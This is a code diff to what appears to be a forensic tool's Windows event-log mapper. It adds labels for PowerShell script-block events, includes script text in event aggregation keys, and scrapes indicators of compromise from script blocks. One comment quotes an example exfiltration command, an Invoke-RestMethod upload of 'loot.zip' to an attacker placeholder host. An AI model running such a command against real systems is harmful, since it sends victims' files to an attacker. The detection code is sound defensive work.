@@ -388,6 +388,19 @@ const WIN_EVENTS: Record<number, WinEventDef> = {
   6006: { label: "Event log service stopped", severity: "Low" },
 };
 
+// PowerShell/Operational events, keyed separately from WIN_EVENTS because that table is looked up
+// by EVENT ID ALONE: an unrelated Application-channel event that happens to be 4104 would otherwise
+// be labelled a script block. Severity stays Info deliberately — script-block logging is telemetry,
+// not a verdict, and Info is exactly the floor the forensic gate uses to keep raw telemetry out of
+// the AI's timeline. A script block that IS suspicious is graded by whatever adjudicated it (a Sigma
+// or DetectRaptor verdict, or a tagger rule), the same way 4104 was graded before it had a label.
+// The label is the whole point of the entry: without it a parsed script block read as "Event 4104"
+// or as the rendered message's boilerplate first line ("Creating Scriptblock text (1 of 1):").
+const POWERSHELL_EVENTS: Record<number, WinEventDef> = {
+  4104: { label: "Script block logged", severity: "Info" },
+  4103: { label: "Module/pipeline execution", severity: "Info" },
+};
+
 // Sysmon (Microsoft-Windows-Sysmon/Operational) events — keyed separately because the
 // EID numbering overlaps the Security channel (Sysmon 1 ≠ Security 1).
 const SYSMON_EVENTS: Record<number, WinEventDef> = {
@@ -685,6 +698,15 @@ const SUBJECT_KEYS = [
   "StartType",
   "Image",
   "CommandLine",
+  // For a PowerShell script block the SCRIPT IS the subject, exactly as the command line is the
+  // subject of a process creation — and for the same reason it must be here: this list feeds the
+  // aggregation key, so without it two entirely different scripts on the same channel shared one
+  // key and collapsed into a single event. That was survivable while a script block yielded no
+  // indicators; now that it does, every IOC scraped from the merged-away records would be stamped
+  // with the surviving event's id, pointing an analyst at a script that never contained them (the
+  // #640 failure, in a new place). NOT ScriptBlockId — that is a per-COMPILATION guid, so keying on
+  // it would stop genuine repeats of one script from ever aggregating.
+  "ScriptBlockText",
   "NewProcessName",
   "ParentImage",
   "ParentCommandLine",
@@ -887,7 +909,12 @@ export function mapWindows(
   const edRaw = getCI(rec, "event_data") ?? getPath(rec, "winlog.event_data") ?? getCI(rec, "EventData");
   const ed: Row = isObject(edRaw) ? edRaw : {};
   const isSysmon = /sysmon/i.test(channel);
-  const def: WinEventDef = (isSysmon ? SYSMON_EVENTS[eid] : WIN_EVENTS[eid]) ?? {
+  const isPwsh = /powershell/i.test(channel);
+  const def: WinEventDef = (isSysmon
+    ? SYSMON_EVENTS[eid]
+    : isPwsh
+      ? POWERSHELL_EVENTS[eid]
+      : WIN_EVENTS[eid]) ?? {
     label: oneLine(firstStr(rec, ["message", "Message"]).split(/[\r\n]/)[0] || `Event ${eid}`).slice(0, 120),
     severity: "Info",
   };
@@ -1192,6 +1219,15 @@ export function mapWindows(
   // `Invoke-RestMethod -Uri https://mft.attacker.tld -InFile loot.zip` never became an IOC. textIocs
   // already skips internal AD/mDNS zones (.local/.lan/.corp) and filenames, so this stays signal-rich.
   if (def.kind === "process") textIocs(str(getCI(ed, "CommandLine")), iocSink);
+  // A PowerShell 4104 script block is evidence in exactly the same way a command line is — it is
+  // where the download cradle names its C2 — but it arrives under `ScriptBlockText` with no
+  // `kind: "process"` to trigger the scrape above, so a natively-parsed 4104 row yielded NO IOCs at
+  // all: not the URL, not the IP, not the domain (#652). Scraped here rather than on any one
+  // importer's path because every shape that reaches a PARSED 4104 — Velociraptor eventlog, Sigma
+  // and DetectRaptor rows, raw EVTX XML, Chainsaw, generic SIEM records — funnels through
+  // mapWindows. Hayabusa does NOT: it renders events through its own output profile and has its own
+  // mapper, which scrapes the script block itself.
+  textIocs(str(getCI(ed, "ScriptBlockText")), iocSink);
   const dns = str(getCI(ed, "QueryName")).trim();
   if (def.kind === "dns" && dns && dns !== "-" && /\./.test(dns))
     addIoc(iocSink, "domain", dns.replace(/\.$/, ""));
